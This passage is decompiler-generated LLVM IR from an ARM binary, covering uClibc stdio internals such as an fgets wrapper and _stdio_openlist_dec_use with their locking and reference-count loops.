  store i1 %v3_15f94, i1* %cpsr_c.global-to-local, align 1
  %v9_15f94 = icmp eq i32 %v3_15f8c, %v1_15f90
  br i1 %v9_15f94, label %dec_label_pc_15fe0, label %dec_label_pc_15f9c

dec_label_pc_15f9c:                               ; preds = %dec_label_pc_15f88
  %v1_15f9c = add i32 %arg3, 56
  store i32 %v1_15f9c, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_15f9c, i32* %r2.global-to-local, align 4
  %v0_15fa8 = load i32, i32* @r6, align 4
  store i32 %v0_15fa8, i32* @r4, align 4
  %v1_15fac36 = inttoptr i32 %v1_15f9c to i32*
  %v2_15fac37 = load i32, i32* %v1_15fac36, align 4
  store i32 %v2_15fac37, i32* %r3.global-to-local, align 4
  %v3_15fb039 = icmp uge i32 %v2_15fac37, %v0_15fa8
  store i1 %v3_15fb039, i1* %cpsr_c.global-to-local, align 1
  %v9_15fb045 = icmp eq i32 %v2_15fac37, %v0_15fa8
  br i1 %v9_15fb045, label %dec_label_pc_15fb8, label %dec_label_pc_15fd0

dec_label_pc_15fb8:                               ; preds = %dec_label_pc_15f9c, %dec_label_pc_15fb8.dec_label_pc_15fac_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15fc8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15fc8, label %dec_label_pc_15fcc, label %dec_label_pc_15fb8.dec_label_pc_15fac_crit_edge

dec_label_pc_15fb8.dec_label_pc_15fac_crit_edge:  ; preds = %dec_label_pc_15fb8
  %v0_15fac.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15fb0.pre = load i32, i32* @r4, align 4
  %v1_15fac = inttoptr i32 %v0_15fac.pre to i32*
  %v2_15fac = load i32, i32* %v1_15fac, align 4
  store i32 %v2_15fac, i32* %r3.global-to-local, align 4
  %v3_15fb0 = icmp uge i32 %v2_15fac, %v1_15fb0.pre
  store i1 %v3_15fb0, i1* %cpsr_c.global-to-local, align 1
  %v9_15fb0 = icmp eq i32 %v2_15fac, %v1_15fb0.pre
  br i1 %v9_15fb0, label %dec_label_pc_15fb8, label %dec_label_pc_15fd0

dec_label_pc_15fcc:                               ; preds = %dec_label_pc_15fb8
  %v0_15fcc = load i32, i32* @r4, align 4
  store i32 %v0_15fcc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15fd0

dec_label_pc_15fd0:                               ; preds = %dec_label_pc_15f9c, %dec_label_pc_15fb8.dec_label_pc_15fac_crit_edge, %dec_label_pc_15fcc
  %v0_15fd0 = phi i32 [ %v0_15fcc, %dec_label_pc_15fcc ], [ %v2_15fac37, %dec_label_pc_15f9c ], [ %v2_15fac, %dec_label_pc_15fb8.dec_label_pc_15fac_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15fd0 = icmp eq i32 %v0_15fd0, 0
  br i1 %v2_15fd0, label %bb20, label %bb

bb:                                               ; preds = %dec_label_pc_15fd0
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_15fd0, %bb
  store i32 90076, i32* @lr, align 4
  %v1_15fd8 = xor i1 %v2_15fd0, true
  call void @__pseudo_cond_branch(i1 %v1_15fd8, i32 ptrtoint (i32* @global_var_13c8c.468 to i32))
  %v0_15fdc = load i32, i32* @r8, align 4
  %v1_15fdc = load i32, i32* @r7, align 4
  %v2_15fdc = add i32 %v1_15fdc, 64
  %v3_15fdc = inttoptr i32 %v2_15fdc to i32*
  store i32 %v0_15fdc, i32* %v3_15fdc, align 4
  br label %dec_label_pc_15fe0

dec_label_pc_15fe0:                               ; preds = %dec_label_pc_15f88, %bb20
  %v0_15fe0 = load i32, i32* @r7, align 4
  %v1_15fe0 = add i32 %v0_15fe0, 60
  %v2_15fe0 = inttoptr i32 %v1_15fe0 to i32*
  %v3_15fe0 = load i32, i32* %v2_15fe0, align 4
  %v1_15fe4 = add i32 %v3_15fe0, 1
  store i32 %v1_15fe4, i32* %r3.global-to-local, align 4
  store i32 %v1_15fe4, i32* %v2_15fe0, align 4
  %v0_15fec.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_15ff0.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_15ff4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15fec

dec_label_pc_15fec:                               ; preds = %entry, %dec_label_pc_15fe0
  %v0_15ff4 = phi i32 [ %arg3, %entry ], [ %v0_15ff4.pre, %dec_label_pc_15fe0 ]
  %v0_15ff0 = phi i32 [ %arg2, %entry ], [ %v0_15ff0.pre, %dec_label_pc_15fe0 ]
  %v0_15fec = phi i32 [ %arg1, %entry ], [ %v0_15fec.pre, %dec_label_pc_15fe0 ]
  store i32 %v0_15ff0, i32* %r1.global-to-local, align 4
  store i32 %v0_15ff4, i32* %r2.global-to-local, align 4
  %v3_15ff8 = inttoptr i32 %v0_15fec to i8*
  %v4_15ff8 = call i32 @__GI_fgets_unlocked(i8* %v3_15ff8, i32 %v0_15ff0, i32 %v0_15ff4)
  %v0_15ffc = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15ffc = icmp eq i32 %v0_15ffc, 0
  store i32 %v4_15ff8, i32* %r8.global-to-local, align 4
  br i1 %v2_15ffc, label %dec_label_pc_16008, label %dec_label_pc_1607c

dec_label_pc_16008:                               ; preds = %dec_label_pc_15fec
  %v0_16008 = load i32, i32* @r7, align 4
  %v1_16008 = add i32 %v0_16008, 60
  %v2_16008 = inttoptr i32 %v1_16008 to i32*
  %v3_16008 = load i32, i32* %v2_16008, align 4
  %v1_1600c = add i32 %v3_16008, -1
  store i32 %v1_1600c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16010 = icmp eq i32 %v1_1600c, 0
  store i32 %v1_1600c, i32* %v2_16008, align 4
  br i1 %v2_16010, label %dec_label_pc_1601c, label %dec_label_pc_1607c

dec_label_pc_1601c:                               ; preds = %dec_label_pc_16008
  %v0_1601c = load i32, i32* %r3.global-to-local, align 4
  %v1_1601c = load i32, i32* @r7, align 4
  %v2_1601c = add i32 %v1_1601c, 64
  %v3_1601c = inttoptr i32 %v2_1601c to i32*
  store i32 %v0_1601c, i32* %v3_1601c, align 4
  %v0_16020 = load i32, i32* @r7, align 4
  %v1_16020 = add i32 %v0_16020, 56
  store i32 %v1_16020, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16024

dec_label_pc_16024:                               ; preds = %dec_label_pc_16054.dec_label_pc_16024_crit_edge, %dec_label_pc_1601c
  %v0_1602c = phi i32 [ %v0_1602c.pre, %dec_label_pc_16054.dec_label_pc_16024_crit_edge ], [ %v1_16020, %dec_label_pc_1601c ]
  %v0_16024 = phi i32 [ %v0_16024.pre, %dec_label_pc_16054.dec_label_pc_16024_crit_edge ], [ %v0_16020, %dec_label_pc_1601c ]
  %v1_16024 = add i32 %v0_16024, 56
  %v2_16024 = inttoptr i32 %v1_16024 to i32*
  %v3_16024 = load i32, i32* %v2_16024, align 4
  store i32 %v3_16024, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1602c, i32* %r2.global-to-local, align 4
  %v1_1603024 = inttoptr i32 %v0_1602c to i32*
  %v2_1603025 = load i32, i32* %v1_1603024, align 4
  store i32 %v2_1603025, i32* %r3.global-to-local, align 4
  %v3_1603427 = icmp uge i32 %v2_1603025, %v3_16024
  store i1 %v3_1603427, i1* %cpsr_c.global-to-local, align 1
  %v9_1603433 = icmp eq i32 %v2_1603025, %v3_16024
  br i1 %v9_1603433, label %dec_label_pc_1603c, label %dec_label_pc_16054

dec_label_pc_1603c:                               ; preds = %dec_label_pc_16024, %dec_label_pc_1603c.dec_label_pc_16030_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1604c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1604c, label %dec_label_pc_16050, label %dec_label_pc_1603c.dec_label_pc_16030_crit_edge

dec_label_pc_1603c.dec_label_pc_16030_crit_edge:  ; preds = %dec_label_pc_1603c
  %v0_16030.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16034.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16030 = inttoptr i32 %v0_16030.pre to i32*
  %v2_16030 = load i32, i32* %v1_16030, align 4
  store i32 %v2_16030, i32* %r3.global-to-local, align 4
  %v3_16034 = icmp uge i32 %v2_16030, %v1_16034.pre
  store i1 %v3_16034, i1* %cpsr_c.global-to-local, align 1
  %v9_16034 = icmp eq i32 %v2_16030, %v1_16034.pre
  br i1 %v9_16034, label %dec_label_pc_1603c, label %dec_label_pc_16054

dec_label_pc_16050:                               ; preds = %dec_label_pc_1603c
  %v0_16050 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16050, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16054

dec_label_pc_16054:                               ; preds = %dec_label_pc_16024, %dec_label_pc_1603c.dec_label_pc_16030_crit_edge, %dec_label_pc_16050
  %v0_1605c = phi i32 [ %v0_16050, %dec_label_pc_16050 ], [ %v2_1603025, %dec_label_pc_16024 ], [ %v2_16030, %dec_label_pc_1603c.dec_label_pc_16030_crit_edge ]
  %v1_16054 = phi i32 [ %v0_16050, %dec_label_pc_16050 ], [ %v3_16024, %dec_label_pc_16024 ], [ %v1_16034.pre, %dec_label_pc_1603c.dec_label_pc_16030_crit_edge ]
  %v3_16054 = icmp uge i32 %v0_1605c, %v1_16054
  store i1 %v3_16054, i1* %cpsr_c.global-to-local, align 1
  %v9_16054 = icmp eq i32 %v0_1605c, %v1_16054
  br i1 %v9_16054, label %dec_label_pc_1605c, label %dec_label_pc_16054.dec_label_pc_16024_crit_edge

dec_label_pc_16054.dec_label_pc_16024_crit_edge:  ; preds = %dec_label_pc_16054
  %v0_16024.pre = load i32, i32* @r7, align 4
  %v0_1602c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16024

dec_label_pc_1605c:                               ; preds = %dec_label_pc_16054
  %v2_1605c = icmp ne i32 %v1_16054, 0
  store i1 %v2_1605c, i1* %cpsr_c.global-to-local, align 1
  %v7_16060 = icmp slt i32 %v1_16054, 2
  br i1 %v7_16060, label %dec_label_pc_1607c, label %dec_label_pc_16064

dec_label_pc_16064:                               ; preds = %dec_label_pc_1605c
  %v0_16068 = load i32, i32* %r1.global-to-local, align 4
  %v1_16068 = add i32 %v0_16068, 129
  store i32 %v1_16068, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1607c

dec_label_pc_1607c:                               ; preds = %dec_label_pc_16008, %dec_label_pc_15fec, %dec_label_pc_16064, %dec_label_pc_1605c
  %v0_1607c = load i32, i32* %r8.global-to-local, align 4
  %v2_16080 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_16080, i32* %r4.global-to-local, align 4
  store i32 %v6_15f6c, i32* @r5, align 4
  store i32 %v9_15f6c, i32* @r6, align 4
  store i32 %v12_15f6c, i32* @r7, align 4
  store i32 %v15_15f6c, i32* @r8, align 4
  store i32 %v24_15f6c, i32* @lr, align 4
  ret i32 %v0_1607c

; uselistorder directives
  uselistorder i32 %v0_16050, { 1, 0, 2 }
  uselistorder i32 %v1_16034.pre, { 0, 2, 1 }
  uselistorder i32 %v0_15ff0, { 1, 0 }
  uselistorder i32 %v0_15ff4, { 1, 0 }
  uselistorder i32 %v1_15fb0.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 5, 4, 1, 6, 7, 8, 9, 11, 10, 0, 12 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 4, 3, 0, 5, 6, 7, 8, 11, 12, 9, 10 }
  uselistorder i32 %arg3, { 0, 2, 1, 4, 3, 5 }
  uselistorder label %dec_label_pc_1607c, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_16054, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1603c, { 1, 0 }
  uselistorder label %dec_label_pc_15fec, { 1, 0 }
  uselistorder label %dec_label_pc_15fe0, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_15fd0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15fb8, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_16088 = load i32, i32* @r4, align 4
  store i32 %v3_16088, i32* %stack_var_-20, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r5.global-to-local, align 4
  %v4_16098 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 160) to i32*), align 4
  store i32 %v4_16098, i32* %r7.global-to-local, align 4
  %v0_1609c = call i32 @__aeabi_read_tp()
  store i32 %v0_1609c, i32* %r0.global-to-local, align 4
  %v1_160a0 = add i32 %v4_16098, 8
  %v2_160a0 = inttoptr i32 %v1_160a0 to i32*
  %v3_160a0 = load i32, i32* %v2_160a0, align 4
  store i32 %v3_160a0, i32* %r3.global-to-local, align 4
  %v1_160a4 = add i32 %v0_1609c, -1168
  store i32 %v1_160a4, i32* %r6.global-to-local, align 4
  %v3_160a8 = icmp uge i32 %v3_160a0, %v1_160a4
  store i1 %v3_160a8, i1* %cpsr_c.global-to-local, align 1
  %v9_160a8 = icmp eq i32 %v3_160a0, %v1_160a4
  br i1 %v9_160a8, label %dec_label_pc_160f4, label %dec_label_pc_160b4

dec_label_pc_160b4:                               ; preds = %entry
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_16098, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_160c093 = inttoptr i32 %v4_16098 to i32*
  %v2_160c094 = load i32, i32* %v1_160c093, align 4
  store i32 %v2_160c094, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_160c496 = icmp eq i32 %v2_160c094, 0
  br i1 %v9_160c496, label %dec_label_pc_160cc, label %dec_label_pc_160e4

dec_label_pc_160cc:                               ; preds = %dec_label_pc_160b4, %dec_label_pc_160cc.dec_label_pc_160c0_crit_edge
  %v0_160cc97 = phi i32 [ %v1_160c4.pre, %dec_label_pc_160cc.dec_label_pc_160c0_crit_edge ], [ 0, %dec_label_pc_160b4 ]
  store i32 %v0_160cc97, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_160dc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_160dc, label %dec_label_pc_160e0, label %dec_label_pc_160cc.dec_label_pc_160c0_crit_edge

dec_label_pc_160cc.dec_label_pc_160c0_crit_edge:  ; preds = %dec_label_pc_160cc
  %v0_160c0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_160c4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_160c0 = inttoptr i32 %v0_160c0.pre to i32*
  %v2_160c0 = load i32, i32* %v1_160c0, align 4
  store i32 %v2_160c0, i32* %r3.global-to-local, align 4
  %v3_160c4 = icmp uge i32 %v2_160c0, %v1_160c4.pre
  store i1 %v3_160c4, i1* %cpsr_c.global-to-local, align 1
  %v9_160c4 = icmp eq i32 %v2_160c0, %v1_160c4.pre
  br i1 %v9_160c4, label %dec_label_pc_160cc, label %dec_label_pc_160e4

dec_label_pc_160e0:                               ; preds = %dec_label_pc_160cc
  %v0_160e0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_160e0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_160e4

dec_label_pc_160e4:                               ; preds = %dec_label_pc_160b4, %dec_label_pc_160cc.dec_label_pc_160c0_crit_edge, %dec_label_pc_160e0
  %v0_160e4 = phi i32 [ %v0_160e0, %dec_label_pc_160e0 ], [ %v2_160c094, %dec_label_pc_160b4 ], [ %v2_160c0, %dec_label_pc_160cc.dec_label_pc_160c0_crit_edge ]
  %v1_160e4 = phi i32 [ %v0_160e0, %dec_label_pc_160e0 ], [ 0, %dec_label_pc_160b4 ], [ %v1_160c4.pre, %dec_label_pc_160cc.dec_label_pc_160c0_crit_edge ]
  %v3_160e4 = icmp uge i32 %v0_160e4, %v1_160e4
  store i1 %v3_160e4, i1* %cpsr_c.global-to-local, align 1
  %v9_160e4 = icmp eq i32 %v0_160e4, %v1_160e4
  br i1 %v9_160e4, label %bb45, label %bb

bb:                                               ; preds = %dec_label_pc_160e4
  %v1_160e8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_160e8, i32* %r0.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_160e4, %bb
  %v1_160ec = xor i1 %v9_160e4, true
  call void @__pseudo_cond_branch(i1 %v1_160ec, i32 ptrtoint (i32* @global_var_13c8c.468 to i32))
  %v0_160f0 = load i32, i32* %r6.global-to-local, align 4
  %v1_160f0 = load i32, i32* %r7.global-to-local, align 4
  %v2_160f0 = add i32 %v1_160f0, 8
  %v3_160f0 = inttoptr i32 %v2_160f0 to i32*
  store i32 %v0_160f0, i32* %v3_160f0, align 4
  br label %dec_label_pc_160f4

dec_label_pc_160f4:                               ; preds = %entry, %bb45
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_160f8 = load i32, i32* %r5.global-to-local, align 4
  %v2_160f8 = add i32 %v0_160f8, 160
  %v3_160f8 = inttoptr i32 %v2_160f8 to i32*
  %v4_160f8 = load i32, i32* %v3_160f8, align 4
  store i32 %v4_160f8, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16100 = add i32 %v0_160f8, 12
  %v3_16100 = inttoptr i32 %v2_16100 to i32*
  %v4_16100 = load i32, i32* %v3_16100, align 4
  store i32 %v4_16100, i32* %r3.global-to-local, align 4
  %v1_16104 = inttoptr i32 %v4_16100 to i32*
  %v2_16104 = load i32, i32* %v1_16104, align 4
  store i32 %v2_16104, i32* %r1.global-to-local, align 4
  %v1_16108 = add i32 %v4_160f8, 4
  %v2_16108 = inttoptr i32 %v1_16108 to i32*
  %v3_16108 = load i32, i32* %v2_16108, align 4
  %v2_1610c = icmp ne i32 %v2_16104, 0
  store i1 %v2_1610c, i1* %cpsr_c.global-to-local, align 1
  %v7_1610c = icmp eq i32 %v2_16104, 1
  %v1_16110 = add i32 %v3_16108, 1
  store i32 %v1_16110, i32* %r3.global-to-local, align 4
  store i32 %v1_16110, i32* %v2_16108, align 4
  br i1 %v7_1610c, label %dec_label_pc_1611c, label %dec_label_pc_16280

dec_label_pc_1611c:                               ; preds = %dec_label_pc_160f4
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_16120 = load i32, i32* %r5.global-to-local, align 4
  %v2_16120 = add i32 %v0_16120, 80
  %v3_16120 = inttoptr i32 %v2_16120 to i32*
  %v4_16120 = load i32, i32* %v3_16120, align 4
  store i32 %v4_16120, i32* %r3.global-to-local, align 4
  %v1_16124 = inttoptr i32 %v4_16120 to i32*
  %v2_16124 = load i32, i32* %v1_16124, align 4
  store i32 %v2_16124, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp46 = icmp slt i32 %v2_16124, 1
  br i1 %tmp46, label %dec_label_pc_16280, label %dec_label_pc_16130

dec_label_pc_16130:                               ; preds = %dec_label_pc_1611c
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_16134 = add i32 %v0_16120, 152
  %v3_16134 = inttoptr i32 %v2_16134 to i32*
  %v4_16134 = load i32, i32* %v3_16134, align 4
  store i32 %v4_16134, i32* %r7.global-to-local, align 4
  %v1_16138 = add i32 %v4_16134, 8
  %v2_16138 = inttoptr i32 %v1_16138 to i32*
  %v3_16138 = load i32, i32* %v2_16138, align 4
  store i32 %v3_16138, i32* %r3.global-to-local, align 4
  %v1_1613c = load i32, i32* %r6.global-to-local, align 4
  %v3_1613c = icmp uge i32 %v3_16138, %v1_1613c
  store i1 %v3_1613c, i1* %cpsr_c.global-to-local, align 1
  %v9_1613c = icmp eq i32 %v3_16138, %v1_1613c
  br i1 %v9_1613c, label %dec_label_pc_16180, label %dec_label_pc_16144

dec_label_pc_16144:                               ; preds = %dec_label_pc_16130
  store i32 %v4_16134, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1614c86 = inttoptr i32 %v4_16134 to i32*
  %v2_1614c87 = load i32, i32* %v1_1614c86, align 4
  store i32 %v2_1614c87, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1615089 = icmp eq i32 %v2_1614c87, 0
  br i1 %v9_1615089, label %dec_label_pc_16158, label %dec_label_pc_16170

dec_label_pc_16158:                               ; preds = %dec_label_pc_16144, %dec_label_pc_16158.dec_label_pc_1614c_crit_edge
  %v0_1615890 = phi i32 [ %v1_16150.pre, %dec_label_pc_16158.dec_label_pc_1614c_crit_edge ], [ 0, %dec_label_pc_16144 ]
  store i32 %v0_1615890, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16168 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16168, label %dec_label_pc_1616c, label %dec_label_pc_16158.dec_label_pc_1614c_crit_edge

dec_label_pc_16158.dec_label_pc_1614c_crit_edge:  ; preds = %dec_label_pc_16158
  %v0_1614c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16150.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1614c = inttoptr i32 %v0_1614c.pre to i32*
  %v2_1614c = load i32, i32* %v1_1614c, align 4
  store i32 %v2_1614c, i32* %r3.global-to-local, align 4
  %v3_16150 = icmp uge i32 %v2_1614c, %v1_16150.pre
  store i1 %v3_16150, i1* %cpsr_c.global-to-local, align 1
  %v9_16150 = icmp eq i32 %v2_1614c, %v1_16150.pre
  br i1 %v9_16150, label %dec_label_pc_16158, label %dec_label_pc_16170

dec_label_pc_1616c:                               ; preds = %dec_label_pc_16158
  %v0_1616c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1616c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16170

dec_label_pc_16170:                               ; preds = %dec_label_pc_16144, %dec_label_pc_16158.dec_label_pc_1614c_crit_edge, %dec_label_pc_1616c
  %v0_16170 = phi i32 [ %v0_1616c, %dec_label_pc_1616c ], [ %v2_1614c87, %dec_label_pc_16144 ], [ %v2_1614c, %dec_label_pc_16158.dec_label_pc_1614c_crit_edge ]
  %v1_16170 = phi i32 [ %v0_1616c, %dec_label_pc_1616c ], [ 0, %dec_label_pc_16144 ], [ %v1_16150.pre, %dec_label_pc_16158.dec_label_pc_1614c_crit_edge ]
  %v3_16170 = icmp uge i32 %v0_16170, %v1_16170
  store i1 %v3_16170, i1* %cpsr_c.global-to-local, align 1
  %v9_16170 = icmp eq i32 %v0_16170, %v1_16170
  br i1 %v9_16170, label %bb48, label %bb47

bb47:                                             ; preds = %dec_label_pc_16170
  %v1_16174 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_16174, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_16170, %bb47
  %v1_16178 = xor i1 %v9_16170, true
  call void @__pseudo_cond_branch(i1 %v1_16178, i32 ptrtoint (i32* @global_var_13c8c.468 to i32))
  %v0_1617c = load i32, i32* %r6.global-to-local, align 4
  %v1_1617c = load i32, i32* %r7.global-to-local, align 4
  %v2_1617c = add i32 %v1_1617c, 8
  %v3_1617c = inttoptr i32 %v2_1617c to i32*
  store i32 %v0_1617c, i32* %v3_1617c, align 4
  %v0_16188.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16180

dec_label_pc_16180:                               ; preds = %dec_label_pc_16130, %bb48
  %v0_16188 = phi i32 [ %v0_16120, %dec_label_pc_16130 ], [ %v0_16188.pre, %bb48 ]
  store i32 152, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r1.global-to-local, align 4
  %v2_16188 = add i32 %v0_16188, 152
  %v3_16188 = inttoptr i32 %v2_16188 to i32*
  %v4_16188 = load i32, i32* %v3_16188, align 4
  store i32 %v4_16188, i32* %r0.global-to-local, align 4
  %v2_1618c = add i32 %v0_16188, 76
  %v3_1618c = inttoptr i32 %v2_1618c to i32*
  %v4_1618c = load i32, i32* %v3_1618c, align 4
  store i32 %v4_1618c, i32* %r2.global-to-local, align 4
  %v1_16190 = add i32 %v4_16188, 4
  %v2_16190 = inttoptr i32 %v1_16190 to i32*
  %v3_16190 = load i32, i32* %v2_16190, align 4
  store i32 %v3_16190, i32* %r3.global-to-local, align 4
  %v1_16194 = inttoptr i32 %v4_1618c to i32*
  %v2_16194 = load i32, i32* %v1_16194, align 4
  store i32 %v2_16194, i32* %r2.global-to-local, align 4
  %v1_16198 = add i32 %v3_16190, 1
  store i32 %v1_16198, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_16198, i32* %v2_16190, align 4
  %v0_161e8.pr = load i32, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_161e811 = icmp eq i32 %v0_161e8.pr, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_161e811, label %dec_label_pc_161f4, label %dec_label_pc_161ac

dec_label_pc_161ac:                               ; preds = %dec_label_pc_16180, %dec_label_pc_161e4
  %v0_161d02 = phi i32 [ %v0_161e4, %dec_label_pc_161e4 ], [ %v0_161e8.pr, %dec_label_pc_16180 ]
  %v1_161ac = inttoptr i32 %v0_161d02 to i16*
  %v2_161ac = load i16, i16* %v1_161ac, align 2
  %v3_161ac = zext i16 %v2_161ac to i32
  store i32 %v3_161ac, i32* %r3.global-to-local, align 4
  %v2_161b0 = and i32 %v3_161ac, 32816
  store i32 %v2_161b0, i32* %r1.global-to-local, align 4
  %v2_161b4 = icmp ugt i32 %v2_161b0, 47
  store i1 %v2_161b4, i1* %cpsr_c.global-to-local, align 1
  %v7_161b4 = icmp eq i32 %v2_161b0, 48
  %v1_161b8 = add i32 %v0_161d02, 32
  %v2_161b8 = inttoptr i32 %v1_161b8 to i32*
  %v3_161b8 = load i32, i32* %v2_161b8, align 4
  store i32 %v3_161b8, i32* %r4.global-to-local, align 4
  br i1 %v7_161b4, label %dec_label_pc_161c4, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_161ac
  store i32 %v0_161d02, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_161e4

dec_label_pc_161c4:                               ; preds = %dec_label_pc_161ac
  %v0_161c4 = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_161c4 = icmp eq i32 %v0_161c4, 0
  br i1 %v2_161c4, label %.thread, label %bb49

.thread:                                          ; preds = %dec_label_pc_161c4
  %v1_161c8 = load i32, i32* %r5.global-to-local, align 4
  %v2_161c8 = load i32, i32* %r7.global-to-local, align 4
  %v3_161c8 = add i32 %v2_161c8, %v1_161c8
  %v4_161c8 = inttoptr i32 %v3_161c8 to i32*
  %v5_161c8 = load i32, i32* %v4_161c8, align 4
  store i32 %v5_161c8, i32* %r3.global-to-local, align 4
  %v3_161cc = inttoptr i32 %v5_161c8 to i32*
  store i32 %v3_161b8, i32* %v3_161cc, align 4
  %v0_161d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_161d0 = inttoptr i32 %v0_161d0 to i16*
  %v2_161d0 = load i16, i16* %v1_161d0, align 2
  %v3_161d0 = zext i16 %v2_161d0 to i32
  store i32 %v3_161d0, i32* %r3.global-to-local, align 4
  br label %bb50

bb49:                                             ; preds = %dec_label_pc_161c4
  %v2_161d08 = load i16, i16* %v1_161ac, align 2
  %v3_161d09 = zext i16 %v2_161d08 to i32
  store i32 %v3_161d09, i32* %r3.global-to-local, align 4
  %v3_161d4 = add i32 %v0_161c4, 32
  %v4_161d4 = inttoptr i32 %v3_161d4 to i32*
  store i32 %v3_161b8, i32* %v4_161d4, align 4
  %v0_161d8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %.thread, %bb49
  %v0_161d8 = phi i32 [ %v3_161d0, %.thread ], [ %v0_161d8.pre, %bb49 ]
  %v1_161d8 = and i32 %v0_161d8, 8192
  %v2_161d8 = icmp eq i32 %v1_161d8, 0
  br i1 %v2_161d8, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v1_161dc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_161dc, i32* %r0.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v1_161e0 = xor i1 %v2_161d8, true
  call void @__pseudo_cond_branch(i1 %v1_161e0, i32 ptrtoint (i32* @global_var_12ad4.31 to i32))
  %v0_161e4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_161e4

